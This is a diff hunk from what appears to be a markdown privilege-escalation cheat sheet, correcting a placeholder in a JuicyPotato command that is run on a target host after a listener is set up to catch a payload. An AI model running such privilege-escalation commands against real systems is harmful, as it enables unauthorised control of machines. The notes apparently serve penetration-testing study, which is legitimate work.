@@ -182,7 +182,7 @@ Create the listener to cath the payload
 
 Run the exploit on the target host.
 
-<code>JuicyPotato.exe -l 1337 -p [DIR\TO\EXPLOIT] -t * -c {CLSID}</code>
+<code>JuicyPotato.exe -l 1337 -p [DIR\TO\PAYLOAD] -t * -c {CLSID}</code>
 
 ### Service Exploitation
 
